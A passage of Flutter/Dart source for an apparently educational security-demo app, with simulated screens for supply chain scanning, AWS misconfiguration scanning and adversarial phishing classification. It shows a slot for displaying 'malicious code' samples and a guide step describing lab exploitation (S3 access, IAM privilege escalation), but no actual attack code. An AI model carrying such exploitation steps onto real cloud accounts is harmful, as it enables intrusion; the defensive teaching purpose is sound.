  const Project3Screen({super.key});

  @override
  State<Project3Screen> createState() => _Project3ScreenState();
}

class _Project3ScreenState extends State<Project3Screen>
    with SingleTickerProviderStateMixin {
  late TabController _tabs;
  List<Map<String, dynamic>> _packages = [];
  bool _isScanning = false;
  int _activeStep = 0;
  final List<LogEntry> _logs = [];
  late Timer? _scanTimer;

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 3, vsync: this);
    _packages = List<Map<String, dynamic>>.from(
        TestDataGenerator.generatePackages());
    _addLog('INFO', 'Supply Chain Scanner v3.0 initialized', AppTheme.accentGreen);
    _addLog('INFO', 'NVD vulnerability database: synchronized', AppTheme.accentGreen);
    _addLog('INFO', 'SBOM verification engine: READY', AppTheme.accentGreen);
  }

  @override
  void dispose() {
    _tabs.dispose();
    _scanTimer?.cancel();
    super.dispose();
  }

  void _addLog(String level, String msg, Color color) {
    setState(() {
      _logs.add(LogEntry(
        timestamp: DateTime.now().toString().substring(11, 19),
        level: level,
        message: msg,
        color: color,
      ));
    });
  }

  void _runScan() {
    if (_isScanning) return;
    setState(() {
      _isScanning = true;
      _activeStep = 1;
    });

    final steps = [
      () {
        _addLog('SCAN', 'Resolving dependency tree...', AppTheme.accent);
        _addLog('SCAN', 'Found ${_packages.length} packages to analyze', AppTheme.accent);
        setState(() => _activeStep = 2);
      },
      () {
        _addLog('SBOM', 'Generating Software Bill of Materials...', AppTheme.accentPurple);
        _addLog('SBOM', 'Verifying cryptographic hashes...', AppTheme.accentPurple);
      },
      () {
        for (final p in _packages) {
          if (p['status'] == 'COMPROMISED') {
            _addLog('CRITICAL', '${p['name']}@${p['version']}: HASH MISMATCH - COMPROMISED!', AppTheme.accentRed);
          } else if (p['status'] == 'VULNERABLE') {
            _addLog('WARN', '${p['name']}: ${(p['cveIds'] as List).first}', AppTheme.accentOrange);
          }
        }
        setState(() => _activeStep = 3);
      },
      () {
        _addLog('ACTION', 'Triggering incident response playbook...', AppTheme.accentOrange);
        _addLog('ACTION', 'Notifying security team via PagerDuty', AppTheme.accentOrange);
        _addLog('OK', 'Scan complete. Report generated.', AppTheme.accentGreen);
        setState(() {
          _isScanning = false;
          _activeStep = 4;
        });
      },
    ];

    int i = 0;
    _scanTimer = Timer.periodic(const Duration(seconds: 2), (t) {
      if (i < steps.length) {
        steps[i]();
        i++;
      } else {
        t.cancel();
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    final compromised = _packages.where((p) => p['status'] == 'COMPROMISED').length;
    final vulnerable = _packages.where((p) => p['status'] == 'VULNERABLE').length;
    final safe = _packages.where((p) => p['status'] == 'SAFE').length;

    return Scaffold(
      backgroundColor: AppTheme.primary,
      appBar: _buildAppBar(context, 'Project 3: Supply Chain Defense',
          'CI/CD Pipeline Security Scanner', AppTheme.accentOrange),
      body: Column(
        children: [
          Padding(
            padding: const EdgeInsets.all(12),
            child: Row(
              children: [
                Expanded(
                  child: _MetricCard(
                    label: 'Compromised',
                    value: '$compromised',
                    color: AppTheme.accentRed,
                    icon: Icons.dangerous,
                    subtitle: 'Packages',
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: _MetricCard(
                    label: 'Vulnerable',
                    value: '$vulnerable',
                    color: AppTheme.accentOrange,
                    icon: Icons.warning,
                    subtitle: 'CVEs Found',
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: _MetricCard(
                    label: 'Safe',
                    value: '$safe',
                    color: AppTheme.accentGreen,
                    icon: Icons.check_circle,
                    subtitle: 'Verified',
                  ),
                ),
              ],
            ),
          ),
          TabBar(
            controller: _tabs,
            indicatorColor: AppTheme.accentOrange,
            labelColor: AppTheme.accentOrange,
            unselectedLabelColor: AppTheme.textSecondary,
            labelStyle: const TextStyle(fontSize: 11, fontWeight: FontWeight.bold),
            tabs: const [
              Tab(text: 'PACKAGES'),
              Tab(text: 'SBOM'),
              Tab(text: 'GUIDE'),
            ],
          ),
          Expanded(
            child: TabBarView(
              controller: _tabs,
              children: [
                _buildPackagesTab(),
                _buildSBOMTab(),
                _buildGuideTab(),
              ],
            ),
          ),
        ],
      ),
      floatingActionButton: FloatingActionButton.extended(
        onPressed: _isScanning ? null : _runScan,
        backgroundColor: _isScanning ? AppTheme.border : AppTheme.accentOrange,
        icon: _isScanning
            ? const SizedBox(
                width: 18,
                height: 18,
                child: CircularProgressIndicator(strokeWidth: 2),
              )
            : const Icon(Icons.search, color: Colors.black),
        label: Text(
          _isScanning ? 'SCANNING...' : 'SCAN DEPENDENCIES',
          style: const TextStyle(color: Colors.black, fontWeight: FontWeight.bold),
        ),
      ),
    );
  }

  Widget _buildPackagesTab() {
    return ListView(
      padding: const EdgeInsets.all(12),
      children: [
        ..._packages.map((p) => _buildPackageCard(p)),
        const SizedBox(height: 16),
        _TerminalLog(entries: _logs),
        const SizedBox(height: 80),
      ],
    );
  }

  Widget _buildPackageCard(Map<String, dynamic> p) {
    final status = p['status'] as String;
    Color color;
    switch (status) {
      case 'COMPROMISED':
        color = AppTheme.accentRed;
        break;
      case 'VULNERABLE':
        color = AppTheme.accentOrange;
        break;
      default:
        color = AppTheme.accentGreen;
    }

    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      decoration: BoxDecoration(
        color: AppTheme.card,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: color.withValues(alpha: 0.4)),
        boxShadow: [
          if (status == 'COMPROMISED')
            BoxShadow(color: color.withValues(alpha: 0.15), blurRadius: 10),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: const EdgeInsets.all(14),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Icon(Icons.inventory_2, color: color, size: 16),
                    const SizedBox(width: 8),
                    Text(
                      p['name'] as String,
                      style: TextStyle(
                        color: color,
                        fontSize: 14,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'monospace',
                      ),
                    ),
                    const SizedBox(width: 6),
                    Text(
                      'v${p['version']}',
                      style: const TextStyle(
                        color: AppTheme.textSecondary,
                        fontSize: 12,
                        fontFamily: 'monospace',
                      ),
                    ),
                    const Spacer(),
                    _buildSeverityBadge(p['severity'] as String),
                  ],
                ),
                const SizedBox(height: 8),
                Row(
                  children: [
                    _InfoChip(label: p['ecosystem'] as String, color: AppTheme.accent),
                    const SizedBox(width: 6),
                    _InfoChip(label: p['downloadCount'] as String, color: AppTheme.accentPurple),
                    const SizedBox(width: 6),
                    _InfoChip(
                      label: p['hashMatch'] == true ? 'HASH OK' : 'HASH MISMATCH',
                      color: p['hashMatch'] == true ? AppTheme.accentGreen : AppTheme.accentRed,
                      icon: p['hashMatch'] == true ? Icons.verified : Icons.dangerous,
                    ),
                  ],
                ),
                if ((p['issues'] as List).isNotEmpty) ...[
                  const SizedBox(height: 10),
                  const Text(
                    'Issues Detected:',
                    style: TextStyle(
                      color: AppTheme.textSecondary,
                      fontSize: 10,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  const SizedBox(height: 4),
                  ...(p['issues'] as List<String>).map(
                    (issue) => Padding(
                      padding: const EdgeInsets.only(bottom: 3),
                      child: Row(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Icon(Icons.warning, color: color, size: 10),
                          const SizedBox(width: 4),
                          Expanded(
                            child: Text(
                              issue,
                              style: TextStyle(color: color, fontSize: 10),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
                if ((p['cveIds'] as List).isNotEmpty) ...[
                  const SizedBox(height: 6),
                  Wrap(
                    spacing: 4,
                    children: (p['cveIds'] as List<String>)
                        .map((cve) => _InfoChip(
                            label: cve,
                            color: AppTheme.accentRed,
                            icon: Icons.bug_report))
                        .toList(),
                  ),
                ],
              ],
            ),
          ),
          if (p['maliciousCode'] != null)
            ExpansionTile(
              title: const Text(
                'View Malicious Code (Educational)',
                style: TextStyle(color: AppTheme.accentRed, fontSize: 11),
              ),
              leading: const Icon(Icons.code, color: AppTheme.accentRed, size: 16),
              iconColor: AppTheme.accentRed,
              collapsedIconColor: AppTheme.accentRed,
              children: [
                Container(
                  margin: const EdgeInsets.all(12),
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: Colors.black,
                    borderRadius: BorderRadius.circular(6),
                    border: Border.all(color: AppTheme.accentRed.withValues(alpha: 0.3)),
                  ),
                  child: SingleChildScrollView(
                    scrollDirection: Axis.horizontal,
                    child: Text(
                      p['maliciousCode'] as String,
                      style: const TextStyle(
                        color: Color(0xFFFF6B6B),
                        fontSize: 9,
                        fontFamily: 'monospace',
                      ),
                    ),
                  ),
                ),
              ],
            ),
        ],
      ),
    );
  }

  Widget _buildSBOMTab() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        Container(
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: AppTheme.card,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: AppTheme.accentOrange.withValues(alpha: 0.3)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Row(
                children: [
                  Icon(Icons.receipt_long, color: AppTheme.accentOrange, size: 18),
                  SizedBox(width: 8),
                  Text(
                    'Software Bill of Materials',
                    style: TextStyle(
                      color: AppTheme.textPrimary,
                      fontWeight: FontWeight.bold,
                      fontSize: 14,
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 4),
              const Text(
                'CycloneDX 1.4 Format • SPDX Compatible',
                style: TextStyle(color: AppTheme.textSecondary, fontSize: 10),
              ),
              const SizedBox(height: 12),
              ...(_packages.map((p) => _sbomRow(p))),
            ],
          ),
        ),
        const SizedBox(height: 16),
        Container(
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: AppTheme.card,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: AppTheme.accentPurple.withValues(alpha: 0.3)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Row(
                children: [
                  Icon(Icons.play_arrow, color: AppTheme.accentPurple, size: 18),
                  SizedBox(width: 8),
                  Text(
                    'Incident Response Playbook',
                    style: TextStyle(
                      color: AppTheme.textPrimary,
                      fontWeight: FontWeight.bold,
                      fontSize: 14,
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 12),
              _playbookStep('1', 'Isolate compromised packages immediately'),
              _playbookStep('2', 'Pin to last known good version'),
              _playbookStep('3', 'Notify downstream consumers'),
              _playbookStep('4', 'Scan all deployed artifacts'),
              _playbookStep('5', 'File CVE report with NVD'),
              _playbookStep('6', 'Implement Sigstore signing'),
              _playbookStep('7', 'Mandatory 2FA for package maintainers'),
            ],
          ),
        ),
        const SizedBox(height: 80),
      ],
    );
  }

  Widget _sbomRow(Map<String, dynamic> p) {
    final hashMatch = p['hashMatch'] as bool;
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 5),
      child: Row(
        children: [
          Icon(
            hashMatch ? Icons.check_circle : Icons.cancel,
            color: hashMatch ? AppTheme.accentGreen : AppTheme.accentRed,
            size: 14,
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Text(
              '${p['name']}@${p['version']}',
              style: const TextStyle(
                  color: AppTheme.textPrimary,
                  fontSize: 11,
                  fontFamily: 'monospace'),
            ),
          ),
          Text(
            hashMatch ? 'VERIFIED' : 'TAMPERED',
            style: TextStyle(
              color: hashMatch ? AppTheme.accentGreen : AppTheme.accentRed,
              fontSize: 9,
              fontWeight: FontWeight.bold,
            ),
          ),
        ],
      ),
    );
  }

  Widget _playbookStep(String num, String text) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            width: 18,
            height: 18,
            decoration: BoxDecoration(
              color: AppTheme.accentPurple.withValues(alpha: 0.2),
              shape: BoxShape.circle,
              border: Border.all(color: AppTheme.accentPurple.withValues(alpha: 0.5)),
            ),
            child: Center(
              child: Text(num,
                  style: const TextStyle(
                      color: AppTheme.accentPurple, fontSize: 9)),
            ),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Text(
              text,
              style: const TextStyle(color: AppTheme.textPrimary, fontSize: 11),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildGuideTab() {
    return ListView(
      padding: EdgeInsets.zero,
      children: [
        const SizedBox(height: 8),
        _StepCard(
          step: 1,
          title: 'Integrate CI/CD Scanner',
          description: 'Add scanner to pipeline: npm audit, OSV scanner, Grype for container images. Fail builds on CRITICAL.',
          color: AppTheme.accentOrange,
          isCompleted: _activeStep > 1,
          isActive: _activeStep == 1,
        ),
        _StepCard(
          step: 2,
          title: 'Generate SBOM',
          description: 'Use Syft to generate CycloneDX SBOM. Store in artifact registry with git commit hash.',
          color: AppTheme.accentOrange,
          isCompleted: _activeStep > 2,
          isActive: _activeStep == 2,
        ),
        _StepCard(
          step: 3,
          title: 'Hash Verification',
          description: 'Verify package hashes against upstream registries. Use Sigstore/cosign for signing artifacts.',
          color: AppTheme.accentOrange,
          isCompleted: _activeStep > 3,
          isActive: _activeStep == 3,
        ),
        _StepCard(
          step: 4,
          title: 'Runtime Monitoring',
          description: 'Deploy eBPF-based runtime monitor (Falco). Alert on unexpected network calls from libraries.',
          color: AppTheme.accentOrange,
          isCompleted: _activeStep > 4,
          isActive: _activeStep == 4,
        ),
        const SizedBox(height: 80),
      ],
    );
  }
}

// ============================================================
// PROJECT 4: CLOUD SECURITY POSTURE
// ============================================================
class Project4Screen extends StatefulWidget {
  const Project4Screen({super.key});

  @override
  State<Project4Screen> createState() => _Project4ScreenState();
}

class _Project4ScreenState extends State<Project4Screen>
    with SingleTickerProviderStateMixin {
  late TabController _tabs;
  List<Map<String, dynamic>> _findings = [];
  bool _isScanning = false;
  final int _activeStep = 0;
  final List<LogEntry> _logs = [];
  late Timer? _scanTimer;
  final Set<String> _remediatedIds = {};

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 3, vsync: this);
    _findings = List<Map<String, dynamic>>.from(
        TestDataGenerator.generateCloudFindings());
    _addLog('INFO', 'Cloud Security Posture Manager v2.0 initialized', AppTheme.accentGreen);
    _addLog('INFO', 'AWS SDK connection: established', AppTheme.accentGreen);
    _addLog('INFO', 'CIS Benchmark v1.5: LOADED', AppTheme.accentGreen);
  }

  @override
  void dispose() {
    _tabs.dispose();
    _scanTimer?.cancel();
    super.dispose();
  }

  void _addLog(String level, String msg, Color color) {
    setState(() {
      _logs.add(LogEntry(
        timestamp: DateTime.now().toString().substring(11, 19),
        level: level,
        message: msg,
        color: color,
      ));
    });
  }

  void _runScan() {
    if (_isScanning) return;
    setState(() => _isScanning = true);

    _addLog('SCAN', 'Initiating AWS security assessment...', AppTheme.accent);
    int i = 0;
    _scanTimer = Timer.periodic(const Duration(milliseconds: 1500), (t) {
      if (i < _findings.length) {
        final f = _findings[i];
        _addLog(
          f['severity'] == 'CRITICAL' ? 'CRITICAL' : 'WARN',
          '${f['service']}: ${f['title']}',
          f['severity'] == 'CRITICAL' ? AppTheme.accentRed : AppTheme.accentOrange,
        );
        i++;
      } else {
        _addLog('OK', 'Scan complete. ${_findings.length} findings.', AppTheme.accentGreen);
        setState(() => _isScanning = false);
        t.cancel();
      }
    });
  }

  void _remediate(String findingId) {
    setState(() => _remediatedIds.add(findingId));
    final f = _findings.firstWhere((f) => f['id'] == findingId);
    _addLog('ACTION', 'Auto-remediation: ${f['title']}', AppTheme.accentGreen);
    _addLog('OK', 'Applied: ${(f['autoFixCommand'] as String).substring(0, 40)}...', AppTheme.accentGreen);
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('✓ Remediated: ${f['title']}'),
        backgroundColor: AppTheme.accentGreen.withValues(alpha: 0.8),
        duration: const Duration(seconds: 2),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final critical = _findings
        .where((f) => f['severity'] == 'CRITICAL' && !_remediatedIds.contains(f['id']))
        .length;
    final high = _findings
        .where((f) => f['severity'] == 'HIGH' && !_remediatedIds.contains(f['id']))
        .length;
    final remediated = _remediatedIds.length;

    return Scaffold(
      backgroundColor: AppTheme.primary,
      appBar: _buildAppBar(context, 'Project 4: Cloud Security',
          'AWS Misconfiguration Scanner', AppTheme.accentPurple),
      body: Column(
        children: [
          Padding(
            padding: const EdgeInsets.all(12),
            child: Row(
              children: [
                Expanded(
                  child: _MetricCard(
                    label: 'Critical',
                    value: '$critical',
                    color: AppTheme.accentRed,
                    icon: Icons.dangerous,
                    subtitle: 'CVSS 9+',
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: _MetricCard(
                    label: 'High',
                    value: '$high',
                    color: AppTheme.accentOrange,
                    icon: Icons.warning,
                    subtitle: 'CVSS 7-9',
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: _MetricCard(
                    label: 'Fixed',
                    value: '$remediated',
                    color: AppTheme.accentGreen,
                    icon: Icons.check_circle,
                    subtitle: 'Auto-remediated',
                  ),
                ),
              ],
            ),
          ),
          TabBar(
            controller: _tabs,
            indicatorColor: AppTheme.accentPurple,
            labelColor: AppTheme.accentPurple,
            unselectedLabelColor: AppTheme.textSecondary,
            labelStyle: const TextStyle(fontSize: 11, fontWeight: FontWeight.bold),
            tabs: const [
              Tab(text: 'FINDINGS'),
              Tab(text: 'COMPLIANCE'),
              Tab(text: 'GUIDE'),
            ],
          ),
          Expanded(
            child: TabBarView(
              controller: _tabs,
              children: [
                _buildFindingsTab(),
                _buildComplianceTab(),
                _buildGuideTab(),
              ],
            ),
          ),
        ],
      ),
      floatingActionButton: FloatingActionButton.extended(
        onPressed: _isScanning ? null : _runScan,
        backgroundColor: _isScanning ? AppTheme.border : AppTheme.accentPurple,
        icon: _isScanning
            ? const SizedBox(
                width: 18,
                height: 18,
                child: CircularProgressIndicator(strokeWidth: 2),
              )
            : const Icon(Icons.cloud_sync),
        label: Text(_isScanning ? 'SCANNING AWS...' : 'SCAN CLOUD'),
      ),
    );
  }

  Widget _buildFindingsTab() {
    return ListView(
      padding: const EdgeInsets.all(12),
      children: [
        ..._findings.map((f) => _buildFindingCard(f)),
        const SizedBox(height: 16),
        _TerminalLog(entries: _logs),
        const SizedBox(height: 80),
      ],
    );
  }

  Widget _buildFindingCard(Map<String, dynamic> f) {
    final isRemediated = _remediatedIds.contains(f['id']);
    final severity = f['severity'] as String;
    Color color;
    switch (severity) {
      case 'CRITICAL':
        color = AppTheme.accentRed;
        break;
      case 'HIGH':
        color = AppTheme.accentOrange;
        break;
      default:
        color = AppTheme.accentGreen;
    }

    return AnimatedContainer(
      duration: const Duration(milliseconds: 300),
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: isRemediated
            ? AppTheme.accentGreen.withValues(alpha: 0.05)
            : color.withValues(alpha: 0.05),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: isRemediated
              ? AppTheme.accentGreen.withValues(alpha: 0.4)
              : color.withValues(alpha: 0.4),
        ),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(
                isRemediated ? Icons.check_circle : Icons.cloud_off,
                color: isRemediated ? AppTheme.accentGreen : color,
                size: 16,
              ),
              const SizedBox(width: 8),
              Expanded(
                child: Text(
                  f['title'] as String,
                  style: TextStyle(
                    color: isRemediated
                        ? AppTheme.textSecondary
                        : AppTheme.textPrimary,
                    fontSize: 13,
                    fontWeight: FontWeight.bold,
                    decoration:
                        isRemediated ? TextDecoration.lineThrough : null,
                  ),
                ),
              ),
              _buildSeverityBadge(severity),
            ],
          ),
          const SizedBox(height: 8),
          Row(
            children: [
              _InfoChip(label: f['service'] as String, color: AppTheme.accentBlue),
              const SizedBox(width: 6),
              _InfoChip(label: f['cisControl'] as String, color: AppTheme.accent),
              const SizedBox(width: 6),
              Text(
                'Risk: ${f['riskScore']}',
                style: TextStyle(color: color, fontSize: 10, fontWeight: FontWeight.bold),
              ),
            ],
          ),
          const SizedBox(height: 8),
          Text(
            f['description'] as String,
            style: const TextStyle(color: AppTheme.textSecondary, fontSize: 11),
          ),
          const SizedBox(height: 6),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
            decoration: BoxDecoration(
              color: Colors.black,
              borderRadius: BorderRadius.circular(4),
            ),
            child: Text(
              '\$ ${(f['autoFixCommand'] as String).split('--').first}...',
              style: const TextStyle(
                color: AppTheme.accentGreen,
                fontSize: 9,
                fontFamily: 'monospace',
              ),
            ),
          ),
          const SizedBox(height: 8),
          if (!isRemediated && f['autoFixAvailable'] == true)
            SizedBox(
              width: double.infinity,
              child: ElevatedButton.icon(
                onPressed: () => _remediate(f['id'] as String),
                icon: const Icon(Icons.auto_fix_high, size: 14),
                label: const Text('AUTO-REMEDIATE', style: TextStyle(fontSize: 11)),
                style: ElevatedButton.styleFrom(
                  backgroundColor: AppTheme.accentGreen.withValues(alpha: 0.2),
                  foregroundColor: AppTheme.accentGreen,
                  padding: const EdgeInsets.symmetric(vertical: 8),
                ),
              ),
            )
          else if (isRemediated)
            Row(
              children: [
                const Icon(Icons.check_circle, color: AppTheme.accentGreen, size: 14),
                const SizedBox(width: 6),
                const Text('Remediated', style: TextStyle(color: AppTheme.accentGreen, fontSize: 11)),
              ],
            ),
        ],
      ),
    );
  }

  Widget _buildComplianceTab() {
    final frameworks = {
      'GDPR': {'passed': 2, 'failed': 3, 'color': AppTheme.accentBlue},
      'PCI-DSS': {'passed': 1, 'failed': 4, 'color': AppTheme.accentPurple},
      'CIS Benchmark': {'passed': 3, 'failed': 2, 'color': AppTheme.accentOrange},
      'SOC2': {'passed': 2, 'failed': 3, 'color': AppTheme.accent},
    };

    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        ...frameworks.entries.map((e) => _buildComplianceCard(
              e.key,
              e.value['passed'] as int,
              e.value['failed'] as int,
              e.value['color'] as Color,
            )),
        const SizedBox(height: 80),
      ],
    );
  }

  Widget _buildComplianceCard(String framework, int passed, int failed, Color color) {
    final total = passed + failed;
    final pct = passed / total;
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: AppTheme.card,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: color.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text(
                framework,
                style: TextStyle(
                  color: color,
                  fontSize: 15,
                  fontWeight: FontWeight.bold,
                ),
              ),
              Text(
                '$passed/$total controls passed',
                style: const TextStyle(color: AppTheme.textSecondary, fontSize: 11),
              ),
            ],
          ),
          const SizedBox(height: 10),
          ClipRRect(
            borderRadius: BorderRadius.circular(6),
            child: LinearProgressIndicator(
              value: pct,
              backgroundColor: AppTheme.accentRed.withValues(alpha: 0.3),
              valueColor: AlwaysStoppedAnimation(color),
              minHeight: 10,
            ),
          ),
          const SizedBox(height: 6),
          Row(
            children: [
              Text(
                '${(pct * 100).toStringAsFixed(0)}% compliance',
                style: TextStyle(color: color, fontSize: 12, fontWeight: FontWeight.bold),
              ),
              const Spacer(),
              Text(
                '$failed controls failed',
                style: const TextStyle(color: AppTheme.accentRed, fontSize: 10),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildGuideTab() {
    return ListView(
      padding: EdgeInsets.zero,
      children: [
        const SizedBox(height: 8),
        _StepCard(
          step: 1,
          title: 'Connect AWS Account',
          description: 'Create read-only IAM role with SecurityAudit policy. Configure AWS SDK with cross-account access.',
          color: AppTheme.accentPurple,
          isCompleted: _activeStep > 1,
          isActive: _activeStep == 1,
        ),
        _StepCard(
          step: 2,
          title: 'Run CIS Benchmark Scan',
          description: 'Check all AWS services against CIS AWS Foundations Benchmark v1.5. Priority: S3, IAM, EC2, RDS.',
          color: AppTheme.accentPurple,
          isCompleted: _activeStep > 2,
          isActive: _activeStep == 2,
        ),
        _StepCard(
          step: 3,
          title: 'Exploitation PoC (Lab Only)',
          description: 'In test environment: demonstrate S3 data access, IAM privilege escalation, RDS connection.',
          color: AppTheme.accentPurple,
          isCompleted: _activeStep > 3,
          isActive: _activeStep == 3,
        ),
        _StepCard(
          step: 4,
          title: 'Auto-Remediation Engine',
          description: 'Apply fixes via AWS SDK. Create CloudFormation drift detection. Enable AWS Config rules.',
          color: AppTheme.accentPurple,
          isCompleted: _activeStep > 4,
          isActive: _activeStep == 4,
        ),
        const SizedBox(height: 80),
      ],
    );
  }
}

// ============================================================
// PROJECT 5: ADVERSARIAL ML PHISHING
// ============================================================
class Project5Screen extends StatefulWidget {
  const Project5Screen({super.key});

  @override
  State<Project5Screen> createState() => _Project5ScreenState();
}

class _Project5ScreenState extends State<Project5Screen>
    with SingleTickerProviderStateMixin {
  late TabController _tabs;
  List<Map<String, dynamic>> _emails = [];
  bool _isClassifying = false;
  int _activeStep = 0;
  final List<LogEntry> _logs = [];
  late Timer? _classifyTimer;
  Map<String, dynamic>? _mlResults;

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 4, vsync: this);
    _emails = List<Map<String, dynamic>>.from(
        TestDataGenerator.generatePhishingEmails());
    _mlResults = TestDataGenerator.generateMLResults();
    _addLog('INFO', 'NLP Phishing Classifier v2.1 initialized', AppTheme.accentGreen);
    _addLog('INFO', 'BERT model loaded: 110M parameters', AppTheme.accentGreen);
    _addLog('INFO', 'CNN image classifier: READY', AppTheme.accentGreen);
    _addLog('INFO', 'Adversarial defense ensemble: ACTIVE', AppTheme.accentGreen);
  }

  @override
  void dispose() {
    _tabs.dispose();
    _classifyTimer?.cancel();
    super.dispose();
  }

  void _addLog(String level, String msg, Color color) {
    setState(() {
      _logs.add(LogEntry(
        timestamp: DateTime.now().toString().substring(11, 19),
        level: level,
        message: msg,
        color: color,
      ));
    });
  }

  void _classifyAll() {
    if (_isClassifying) return;
    setState(() {
      _isClassifying = true;
      _activeStep = 1;
    });

    _addLog('ML', 'Starting batch classification...', AppTheme.accentGreen);
    int i = 0;
    _classifyTimer = Timer.periodic(const Duration(milliseconds: 1200), (t) {
      if (i < _emails.length) {
        final e = _emails[i];
        final score = e['mlScore'] as double;
        final isPhish = score > 0.5;
        _addLog(
          isPhish ? 'PHISH' : 'CLEAN',
          '${e['id']}: ${e['subject'].toString().substring(0, min(30, (e['subject'] as String).length))}... → ${(score * 100).toStringAsFixed(0)}%',
          isPhish ? AppTheme.accentRed : AppTheme.accentGreen,
        );
        if (e['isAdversarial'] == true) {
          _addLog('ADV', '⚠ Adversarial sample: ${e['evasionAttempt']}', AppTheme.accentOrange);
        }
        i++;
      } else {
        _addLog('OK', 'Classification complete. Results ready.', AppTheme.accentGreen);
        setState(() {
          _isClassifying = false;
          _activeStep = 2;
        });
        t.cancel();
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    final phishing = _emails.where((e) => (e['mlScore'] as double) > 0.5).length;
    final adversarial = _emails.where((e) => e['isAdversarial'] == true).length;
    final clean = _emails.where((e) => (e['mlScore'] as double) <= 0.5).length;

    return Scaffold(
      backgroundColor: AppTheme.primary,
      appBar: _buildAppBar(context, 'Project 5: Adversarial ML Defense',
          'Phishing Classifier & Red/Blue Team', AppTheme.accentGreen),
      body: Column(
        children: [
          Padding(
            padding: const EdgeInsets.all(12),
            child: Row(
              children: [
                Expanded(
                  child: _MetricCard(
                    label: 'Phishing',
                    value: '$phishing',
                    color: AppTheme.accentRed,
                    icon: Icons.phishing,
                    subtitle: 'Detected',
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: _MetricCard(
                    label: 'Adversarial',
                    value: '$adversarial',
                    color: AppTheme.accentOrange,
                    icon: Icons.psychology,
                    subtitle: 'Evasion attempts',
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: _MetricCard(
                    label: 'Legitimate',
                    value: '$clean',
                    color: AppTheme.accentGreen,
                    icon: Icons.mark_email_read,
                    subtitle: 'Clean emails',
                  ),
                ),
              ],
            ),
          ),
          TabBar(
            controller: _tabs,
            isScrollable: true,
            indicatorColor: AppTheme.accentGreen,
            labelColor: AppTheme.accentGreen,
            unselectedLabelColor: AppTheme.textSecondary,
            labelStyle: const TextStyle(fontSize: 11, fontWeight: FontWeight.bold),
            tabs: const [
              Tab(text: 'EMAILS'),
              Tab(text: 'ML METRICS'),
              Tab(text: 'RED/BLUE TEAM'),
              Tab(text: 'GUIDE'),
            ],
          ),
          Expanded(
            child: TabBarView(
              controller: _tabs,
              children: [
                _buildEmailsTab(),
                _buildMLMetricsTab(),
                _buildRedBlueTab(),
                _buildGuideTab(),
              ],
            ),
          ),
        ],
      ),
      floatingActionButton: FloatingActionButton.extended(
        onPressed: _isClassifying ? null : _classifyAll,
        backgroundColor: _isClassifying ? AppTheme.border : AppTheme.accentGreen,
        icon: _isClassifying
            ? const SizedBox(
                width: 18,
                height: 18,
                child: CircularProgressIndicator(strokeWidth: 2, color: Colors.black),
              )
            : const Icon(Icons.model_training, color: Colors.black),
        label: Text(
          _isClassifying ? 'CLASSIFYING...' : 'RUN CLASSIFIER',
          style: const TextStyle(color: Colors.black, fontWeight: FontWeight.bold),
        ),
      ),
    );
  }

  Widget _buildEmailsTab() {
    return ListView(
      padding: const EdgeInsets.all(12),
      children: [
        ..._emails.map((e) => _buildEmailCard(e)),
        const SizedBox(height: 16),
        _TerminalLog(entries: _logs),
        const SizedBox(height: 80),
      ],
    );
  }

  Widget _buildEmailCard(Map<String, dynamic> e) {
    final score = e['mlScore'] as double;
    final isPhish = score > 0.5;
    final isAdv = e['isAdversarial'] as bool;
    Color color;
    if (isAdv) {
      color = AppTheme.accentOrange;
